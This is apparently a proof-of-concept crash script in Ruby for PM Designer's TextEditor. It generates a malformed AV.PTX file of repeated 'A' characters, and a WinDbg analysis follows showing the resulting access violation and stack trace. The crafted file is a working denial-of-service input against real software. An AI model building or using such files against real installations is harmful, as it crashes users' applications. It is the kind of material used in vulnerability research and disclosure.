#!/usr/bin/env ruby
# PM Designer 1.2.98.00/TextEditor 1.0.1
require 'rex'

data = Rex::Text.to_unicode("\xcc" + "A" * 9024)

fd = File.new("AV.PTX","wb")
fd.write(data)
fd.close
__END__

FAULTING_IP: 
TextEditor+3f67
00403f67 8b08            mov     ecx,dword ptr [eax]

EXCEPTION_RECORD:  ffffffff -- (.exr 0xffffffffffffffff)
ExceptionAddress: 00403f67 (TextEditor+0x00003f67)
   ExceptionCode: c0000005 (Access violation)
  ExceptionFlags: 00000000
NumberParameters: 2
   Parameter[0]: 00000000
   Parameter[1]: fffffff0
Attempt to read from address fffffff0

FAULTING_THREAD:  00000344

DEFAULT_BUCKET_ID:  INVALID_POINTER_READ

PROCESS_NAME:  TextEditor.exe

ERROR_CODE: (NTSTATUS) 0xc0000005 - The instruction at 0x%08lx referenced memory at 0x%08lx. The memory could not be %s.

READ_ADDRESS:  fffffff0 

NTGLOBALFLAG:  0

APPLICATION_VERIFIER_FLAGS:  0

PRIMARY_PROBLEM_CLASS:  INVALID_POINTER_READ

BUGCHECK_STR:  APPLICATION_FAULT_INVALID_POINTER_READ

LAST_CONTROL_TRANSFER:  from 00403ea7 to 00403f67

STACK_TEXT:  
WARNING: Stack unwind information not available. Following frames may be wrong.
0012ee44 00403ea7 01434f64 01434f60 0012ee60 TextEditor+0x3f67
0012ee5c 00403e80 004462e8 00000000 01434f64 TextEditor+0x3ea7
0012ee70 00422164 004462e8 017f7f90 01434ed8 TextEditor+0x3e80
0012ee8c 00404f42 01434f64 01434f2c 0000000b TextEditor+0x22164
0012eea4 00404c0b 0012eefc ef49ef0b 75b2de9e TextEditor+0x4f42
0012eee0 0042124a 0012eefc ef49ee97 01434c80 TextEditor+0x4c0b
0012ef7c 0041f325 0012f3e8 ef49ee47 0143179c TextEditor+0x2124a
0012efac 00425049 0012f3e8 00000001 00000111 TextEditor+0x1f325
0012f5f4 00404843 0143a2c8 004578a0 0012f630 TextEditor+0x25049
0012f604 0042530c 0143a2c8 ef49f7db 00000111 TextEditor+0x4843
0012f630 00410331 00444098 004578a0 0012f670 TextEditor+0x2530c
0012f640 00410540 004578a0 0000e101 00000000 TextEditor+0x10331
0012f670 00407732 0000e101 00000000 00000000 TextEditor+0x10540
0012f6b0 0040e86c 0000e101 00000000 00000000 TextEditor+0x7732
0012f700 004072aa 00000000 001e01c8 01434f90 TextEditor+0xe86c
0012f71c 00402679 0000e101 001e01c8 01434f90 TextEditor+0x72aa
0012f730 0040f123 0000e101 001e01c8 ef49f627 TextEditor+0x2679
0012f7cc 0040b237 00000111 0000e101 001e01c8 TextEditor+0xf123
0012f7ec 0040dea7 00000111 0000e101 001e01c8 TextEditor+0xb237
0012f854 0040df36 00000000 00180152 00000111 TextEditor+0xdea7
0012f874 771dc4e7 00180152 00000111 0000e101 TextEditor+0xdf36
0012f8a0 771dc5e7 0040df00 00180152 00000111 USER32!InternalCallWinProc+0x23
0012f918 771d5294 002e88ac 0040df00 00180152 USER32!UserCallWinProcCheckWow+0x14b
0012f958 771d5582 0067e7f0 00696ee8 0000e101 USER32!SendMessageWorker+0x4d0
0012f978 74806977 00180152 00000111 0000e101 USER32!SendMessageW+0x7c
0012f9a0 748069c3 001e01c8 00000202 0000e101 COMCTL32!CToolbar::TBOnLButtonUp+0x12e
0012fa48 747e1618 001e01c8 00000202 00000000 COMCTL32!CToolbar::ToolbarWndProc+0xaad
0012fa68 771dc4e7 001e01c8 00000202 00000000 COMCTL32!CToolbar::s_ToolbarWndProc+0x9d
0012fa94 771dc5e7 747e15dd 001e01c8 00000202 USER32!InternalCallWinProc+0x23
0012fb0c 771d1b31 002e88ac 747e15dd 001e01c8 USER32!UserCallWinProcCheckWow+0x14b
0012fb3c 771d1b57 747e15dd 001e01c8 00000202 USER32!CallWindowProcAorW+0x99
0012fb5c 0040b0ff 747e15dd 001e01c8 00000202 USER32!CallWindowProcW+0x1b
0012fb7c 0040b24e 00000202 00000000 00080008 TextEditor+0xb0ff
0012fb98 00415c02 00000202 00000000 00080008 TextEditor+0xb24e
0012fbbc 0040dea7 00000202 00000000 00080008 TextEditor+0x15c02
0012fc24 0040df36 00000000 001e01c8 00000202 TextEditor+0xdea7
0012fc44 771dc4e7 001e01c8 00000202 00000000 TextEditor+0xdf36
0012fc70 771dc5e7 0040df00 001e01c8 00000202 USER32!InternalCallWinProc+0x23
0012fce8 771dcc19 002e88ac 0040df00 001e01c8 USER32!UserCallWinProcCheckWow+0x14b
0012fd48 771dcc70 0040df00 00000000 0012fd7c USER32!DispatchMessageWorker+0x35e
0012fd58 771d41eb 002e8258 002e8258 01435388 USER32!DispatchMessageW+0xf
0012fd7c 00410a9f 000c0356 0067edb0 01435388 USER32!IsDialogMessageW+0x588
0012fd90 0040b745 002e8258 0012fdf8 00415b12 TextEditor+0x10a9f
0012fd9c 00415b12 002e8258 01435388 014352cc TextEditor+0xb745
0012fdf8 00415ae5 002e8258 002e8258 001e01c8 TextEditor+0x15b12
0012fe54 0040d524 002e8258 002e8258 01434f90 TextEditor+0x15ae5
0012fe68 00411042 00180152 002e8258 002e8228 TextEditor+0xd524
0012fe80 0041119d 002e8258 0012fe9c 004047e3 TextEditor+0x11042
0012fe8c 004047e3 002e8258 004578a0 0012fea8 TextEditor+0x1119d
0012fe9c 0041108d 002e8258 0012fec4 004111ea TextEditor+0x47e3
0012fea8 004111ea 002e8258 00000000 004578a0 TextEditor+0x1108d
0012fec4 00410f10 004578a0 004578a0 ffffffff TextEditor+0x111ea
0012fee4 004404f8 fffffffe 00000000 00000001 TextEditor+0x10f10
0012fef8 0042e382 00400000 00000000 002b16b4 TextEditor+0x404f8
0012ff88 77473c45 7ffdd000 0012ffd4 779637f5 TextEditor+0x2e382
0012ff94 779637f5 7ffdd000 779382d7 00000000 kernel32!BaseThreadInitThunk+0xe
0012ffd4 779637c8 0042e3ed 7ffdd000 00000000 ntdll!__RtlUserThreadStart+0x70
0012ffec 00000000 0042e3ed 7ffdd000 00000000 ntdll!_RtlUserThreadStart+0x1b


FOLLOWUP_IP: 
TextEditor+3f67
00403f67 8b08            mov     ecx,dword ptr [eax]

SYMBOL_STACK_INDEX:  0

SYMBOL_NAME:  TextEditor+3f67

FOLLOWUP_NAME:  MachineOwner

MODULE_NAME: TextEditor

IMAGE_NAME:  TextEditor.exe

DEBUG_FLR_IMAGE_TIMESTAMP:  4c20f84b

STACK_COMMAND:  ~0s ; kb

FAILURE_BUCKET_ID:  INVALID_POINTER_READ_c0000005_TextEditor.exe!Unknown

BUCKET_ID:  APPLICATION_FAULT_INVALID_POINTER_READ_TextEditor+3f67

Followup: MachineOwner
---------

0:000> lmvm TextEditor
start    end        module name
00400000 00463000   TextEditor   (no symbols)           
    Loaded symbol image file: C:\Program Files\PM Designer\V1.2\TextEditor.exe
    Image path: C:\Program Files\PM Designer\V1.2\TextEditor.exe
    Image name: TextEditor.exe
    Timestamp:        Tue Jun 22 11:52:11 2010 (4C20F84B)
    CheckSum:         0005D0D3
    ImageSize:        00063000
    File version:     1.0.0.1
    Product version:  1.0.0.1
    File flags:       0 (Mask 3F)
    File OS:          4 Unknown Win32
    File type:        1.0 App
    File date:        00000000.00000000
    Translations:     0409.04e4
    CompanyName:      TODO: <Company name>
    ProductName:      TODO: <Product name>
    InternalName:     TextEditor.exe
    OriginalFilename: TextEditor.exe
    ProductVersion:   1.0.0.1
    FileVersion:      1.0.0.1
    FileDescription:  TODO: <File description>
    LegalCopyright:   TODO: (c) <Company name>.  All rights reserved.
